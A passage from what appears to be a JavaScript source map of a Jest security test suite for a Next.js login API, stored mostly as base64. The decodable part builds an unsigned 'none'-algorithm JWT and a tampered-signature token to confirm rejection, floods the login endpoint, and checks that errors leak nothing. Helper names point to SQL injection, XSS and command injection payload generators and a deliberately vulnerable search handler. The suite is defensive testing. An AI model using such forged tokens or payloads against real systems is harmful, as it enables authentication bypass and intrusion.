iAndGVzdEBleGFtcGxlLmNvbScgfTtcbiAgICAgIGNvbnN0IHNlY3JldCA9ICd0ZXN0LXNlY3JldCc7XG4gICAgICBjb25zdCB0b2tlbiA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlVmFsaWRKV1QocGF5bG9hZCwgc2VjcmV0KTtcbiAgICAgIFxuICAgICAgY29uc3QgZGVjb2RlZCA9IGp3dC52ZXJpZnkodG9rZW4sIHNlY3JldCkgYXMgYW55O1xuICAgICAgXG4gICAgICBleHBlY3QoZGVjb2RlZC51c2VySWQpLnRvQmUoMSk7XG4gICAgICBleHBlY3QoZGVjb2RlZC5lbWFpbCkudG9CZSgndGVzdEBleGFtcGxlLmNvbScpO1xuICAgICAgZXhwZWN0KGRlY29kZWQuaWF0KS50b0JlRGVmaW5lZCgpO1xuICAgICAgZXhwZWN0KGRlY29kZWQuZXhwKS50b0JlRGVmaW5lZCgpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCBub3QgYWNjZXB0IHRva2VucyB3aXRoIG5vbmUgYWxnb3JpdGhtJywgKCkgPT4ge1xuICAgICAgLy8gQ3JlYXRlIGEgdG9rZW4gd2l0aCAnbm9uZScgYWxnb3JpdGhtIChzZWN1cml0eSB2dWxuZXJhYmlsaXR5KVxuICAgICAgY29uc3QgaGVhZGVyID0gQnVmZmVyLmZyb20oSlNPTi5zdHJpbmdpZnkoeyBhbGc6ICdub25lJywgdHlwOiAnSldUJyB9KSkudG9TdHJpbmcoJ2Jhc2U2NHVybCcpO1xuICAgICAgY29uc3QgcGF5bG9hZCA9IEJ1ZmZlci5mcm9tKEpTT04uc3RyaW5naWZ5KHsgdXNlcklkOiAxLCBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nIH0pKS50b1N0cmluZygnYmFzZTY0dXJsJyk7XG4gICAgICBjb25zdCBub25lVG9rZW4gPSBgJHtoZWFkZXJ9LiR7cGF5bG9hZH0uYDtcbiAgICAgIFxuICAgICAgZXhwZWN0KCgpID0+IHtcbiAgICAgICAgand0LnZlcmlmeShub25lVG9rZW4sIHRlc3RTZWNyZXQpO1xuICAgICAgfSkudG9UaHJvdygpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCB2YWxpZGF0ZSB0b2tlbiBzaWduYXR1cmUnLCAoKSA9PiB7XG4gICAgICBjb25zdCB2YWxpZFRva2VuID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVWYWxpZEpXVCh7IHVzZXJJZDogMSB9LCB0ZXN0U2VjcmV0KTtcbiAgICAgIGNvbnN0IFtoZWFkZXIsIHBheWxvYWQsIHNpZ25hdHVyZV0gPSB2YWxpZFRva2VuLnNwbGl0KCcuJyk7XG4gICAgICBjb25zdCB0YW1wZXJlZFRva2VuID0gYCR7aGVhZGVyfS4ke3BheWxvYWR9LnRhbXBlcmVkX3NpZ25hdHVyZWA7XG4gICAgICBcbiAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgIGp3dC52ZXJpZnkodGFtcGVyZWRUb2tlbiwgdGVzdFNlY3JldCk7XG4gICAgICB9KS50b1Rocm93KCdpbnZhbGlkIHNpZ25hdHVyZScpO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnUmF0ZSBMaW1pdGluZyBTaW11bGF0aW9uJywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgaGFuZGxlIHJhcGlkIHN1Y2Nlc3NpdmUgcmVxdWVzdHMnLCBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCByZXF1ZXN0cyA9IEFycmF5LmZyb20oeyBsZW5ndGg6IDEwMCB9LCAoKSA9PiBcbiAgICAgICAgY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgICAgYm9keToge1xuICAgICAgICAgICAgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyxcbiAgICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICAgIH0sXG4gICAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgICAgICdYLUZvcndhcmRlZC1Gb3InOiAnMTkyLjE2OC4xLjEwMCcsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSlcbiAgICAgICk7XG5cbiAgICAgIC8vIEluIGEgcmVhbCBpbXBsZW1lbnRhdGlvbiwgdGhpcyB3b3VsZCB0cmlnZ2VyIHJhdGUgbGltaXRpbmdcbiAgICAgIGNvbnN0IHJlc3BvbnNlcyA9IGF3YWl0IFByb21pc2UuYWxsKFxuICAgICAgICByZXF1ZXN0cy5tYXAocmVxID0+IHNlY3VyZUF1dGhIYW5kbGVyKHJlcSkpXG4gICAgICApO1xuXG4gICAgICAvLyBBbGwgcmVxdWVzdHMgc2hvdWxkIGJlIHByb2Nlc3NlZCAoaW4gcmVhbCBhcHAsIHNvbWUgd291bGQgYmUgcmF0ZSBsaW1pdGVkKVxuICAgICAgcmVzcG9uc2VzLmZvckVhY2gocmVzcG9uc2UgPT4ge1xuICAgICAgICBleHBlY3QoWzQwMCwgNDAxLCA0MjldKS50b0NvbnRhaW4ocmVzcG9uc2Uuc3RhdHVzKTsgLy8gNDI5ID0gVG9vIE1hbnkgUmVxdWVzdHNcbiAgICAgIH0pO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnRXJyb3IgSGFuZGxpbmcgU2VjdXJpdHknLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCBub3QgZXhwb3NlIHNlbnNpdGl2ZSBpbmZvcm1hdGlvbiBpbiBlcnJvciBtZXNzYWdlcycsIGFzeW5jICgpID0+IHtcbiAgICAgIC8vIFNpbXVsYXRlIGRhdGFiYXNlIGVycm9yXG4gICAgICBtb2NrUHJpc21hLnVzZXIuZmluZFVuaXF1ZS5tb2NrUmVqZWN0ZWRWYWx1ZShuZXcgRXJyb3IoJ0Nvbm5lY3Rpb24gZmFpbGVkIHRvIGRhdGFiYXNlIFwibWRfc3BvcnRzXCIgb24gaG9zdCBcImxvY2FsaG9zdFwiJykpO1xuICAgICAgXG4gICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiB7XG4gICAgICAgICAgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyxcbiAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgfSxcbiAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgIH0sXG4gICAgICB9KTtcblxuICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICBcbiAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNTAwKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS50b0JlKCdJbnRlcm5hbCBzZXJ2ZXIgZXJyb3InKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS5ub3QudG9Db250YWluKCdkYXRhYmFzZScpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLm5vdC50b0NvbnRhaW4oJ2xvY2FsaG9zdCcpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLm5vdC50b0NvbnRhaW4oJ21kX3Nwb3J0cycpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCB1c2UgZ2VuZXJpYyBlcnJvciBtZXNzYWdlcyBmb3IgYXV0aGVudGljYXRpb24gZmFpbHVyZXMnLCBhc3luYyAoKSA9PiB7XG4gICAgICBtb2NrUHJpc21hLnVzZXIuZmluZFVuaXF1ZS5tb2NrUmVzb2x2ZWRWYWx1ZShudWxsKTtcbiAgICAgIFxuICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgYm9keToge1xuICAgICAgICAgIGVtYWlsOiAnbm9uZXhpc3RlbnRAZXhhbXBsZS5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICB9LFxuICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuXG4gICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTtcbiAgICAgIFxuICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg0MDEpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLnRvQmUoJ0ludmFsaWQgY3JlZGVudGlhbHMnKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS5ub3QudG9Db250YWluKCd1c2VyIG5vdCBmb3VuZCcpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLm5vdC50b0NvbnRhaW4oJ2VtYWlsJyk7XG4gICAgfSk7XG4gIH0pO1xufSk7Il0sIm5hbWVzIjpbIk5leHRSZXNwb25zZSIsImpzb24iLCJkYXRhIiwiaW5pdCIsInN0YXR1cyIsImhlYWRlcnMiLCJIZWFkZXJzIiwicmVkaXJlY3QiLCJ1cmwiLCJMb2NhdGlvbiIsImNyZWF0ZU1vY2tOZXh0UmVxdWVzdCIsIm9wdGlvbnMiLCJtZXRob2QiLCJib2R5IiwiSlNPTiIsInBhcnNlIiwidGV4dCIsInN0cmluZ2lmeSIsIlNlY3VyaXR5VGVzdFV0aWxzIiwiZ2VuZXJhdGVTUUxJbmplY3Rpb25QYXlsb2FkcyIsImdlbmVyYXRlWFNTUGF5bG9hZHMiLCJnZW5lcmF0ZUNvbW1hbmRJbmplY3Rpb25QYXlsb2FkcyIsImdlbmVyYXRlTG9uZ1N0cmluZ3MiLCJyZXBlYXQiLCJnZW5lcmF0ZUludmFsaWRUb2tlbnMiLCJoYXNoUGFzc3dvcmQiLCJwYXNzd29yZCIsImJjcnlwdCIsImhhc2giLCJnZW5lcmF0ZVZhbGlkSldUIiwicGF5bG9hZCIsInNlY3JldCIsImp3dCIsInNpZ24iLCJleHBpcmVzSW4iLCJnZW5lcmF0ZUV4cGlyZWRKV1QiLCJtb2NrUHJpc21hIiwidXNlciIsImZpbmRVbmlxdWUiLCJqZXN0IiwiZm4iLCJmaW5kTWFueSIsImNyZWF0ZSIsInVwZGF0ZSIsInByb2R1Y3QiLCIkcXVlcnlSYXciLCIkZXhlY3V0ZVJhdyIsInZ1bG5lcmFibGVTZWFyY2hIYW5kbGVyIiwicmVxIiwiVVJMIiwicXVlcnkiLCJzZWFyY2hQYXJhbXMiLCJnZXQiLCJlcnJvciIsInJlc3VsdHMiLCJzZWN1cmVTZWFyY2hIYW5kbGVyIiwibGVuZ3RoIiwic2FuaXRpemVkUXVlcnkiLCJyZXBsYWNlIiwid2hlcmUiLCJuYW1lIiwiY29udGFpbnMiLCJtb2RlIiwic2VjdXJlQXV0aEhhbmRsZXIiLCJlbWFpbCIsImNsaWVudElQIiwiZW1haWxSZWdleCIsImhhc0NvbnRyb2xDaGFycyIsInRlc3QiLCJzdXNwaWNpb3VzUGF0dGVybnMiLCJpc1N1c3BpY2lvdXMiLCJzb21lIiwicGF0dGVybiIsIlByb21pc2UiLCJyZXNvbHZlIiwic2V0VGltZW91dCIsImlzVmFsaWQiLCJjb21wYXJlIiwidG9rZW4iLCJ1c2VySWQiLCJpZCIsImlhdCIsIk1hdGgiLCJmbG9vciIsIkRhdGUiLCJub3ciLCJpc3N1ZXIiLCJhdWRpZW5jZSIsImRlc2NyaWJlIiwiYmVmb3JlQWxsIiwicHJvY2VzcyIsImVudiIsIkpXVF9TRUNSRVQiLCJiZWZvcmVFYWNoIiwiY2xlYXJBbGxNb2NrcyIsIml0Iiwic3FsUGF5bG9hZHMiLCJyZXF1ZXN0IiwiZW5jb2RlVVJJQ29tcG9uZW50IiwicmVzcG9uc2UiLCJleHBlY3QiLCJub3QiLCJ0b0JlIiwidG9IYXZlUHJvcGVydHkiLCJtb2NrUmVzb2x2ZWRWYWx1ZSIsInRvSGF2ZUJlZW5DYWxsZWRXaXRoIiwieHNzUGF5bG9hZHMiLCJyZXNwb25zZVN0ciIsInRvTWF0Y2giLCJ0ZXN0U2VjcmV0IiwiaW52YWxpZFRva2VucyIsInZlcmlmeSIsInRvVGhyb3ciLCJleHBpcmVkVG9rZW4iLCJpc0ludmFsaWQiLCJ2YWxpZEVtYWlsIiwiaW52YWxpZEVtYWlsIiwibW9ja0ltcGxlbWVudGF0aW9uIiwidmFsaWRSZXF1ZXN0IiwiaW52YWxpZFJlcXVlc3QiLCJzdGFydDEiLCJyZXNwb25zZTEiLCJ0aW1lMSIsInN0YXJ0MiIsInJlc3BvbnNlMiIsInRpbWUyIiwiYWJzIiwidG9CZUxlc3NUaGFuIiwibG9uZ1N0cmluZ3MiLCJsb25nU3RyaW5nIiwiaW52YWxpZEVtYWlscyIsIm1hbGljaW91c0lucHV0cyIsImlucHV0IiwiY29tbWFuZFBheWxvYWRzIiwiaXNWYWxpZEZpbGVOYW1lIiwiZmlsZW5hbWUiLCJkZWNvZGVkIiwidG9CZURlZmluZWQiLCJleHAiLCJoZWFkZXIiLCJCdWZmZXIiLCJmcm9tIiwiYWxnIiwidHlwIiwidG9TdHJpbmciLCJub25lVG9rZW4iLCJ2YWxpZFRva2VuIiwic2lnbmF0dXJlIiwic3BsaXQiLCJ0YW1wZXJlZFRva2VuIiwicmVxdWVzdHMiLCJBcnJheSIsInJlc3BvbnNlcyIsImFsbCIsIm1hcCIsImZvckVhY2giLCJ0b0NvbnRhaW4iLCJtb2NrUmVqZWN0ZWRWYWx1ZSIsIkVycm9yIl0sIm1hcHBpbmdzIjoiOzs7O3lCQUFzRTtxRUFDdEQ7aUVBQ0c7Ozs7OztBQUduQixvQkFBb0I7QUFDcEIsTUFBTUEsZUFBZTtJQUNuQkMsTUFBTSxDQUFDQyxNQUFXQyxPQUF5QixDQUFBO1lBQ3pDRixNQUFNLFVBQVlDO1lBQ2xCRSxRQUFRRCxNQUFNQyxVQUFVO1lBQ3hCQyxTQUFTLElBQUlDLFFBQVFILE1BQU1FO1FBQzdCLENBQUE7SUFDQUUsVUFBVSxDQUFDQyxLQUFhSixTQUFxQixDQUFBO1lBQzNDQSxRQUFRQSxVQUFVO1lBQ2xCQyxTQUFTLElBQUlDLFFBQVE7Z0JBQUVHLFVBQVVEO1lBQUk7UUFDdkMsQ0FBQTtBQUNGO0FBRUEsNkNBQTZDO0FBQzdDLE1BQU1FLHdCQUF3QixDQUFDRixLQUFhRyxVQUl4QyxDQUFDLENBQ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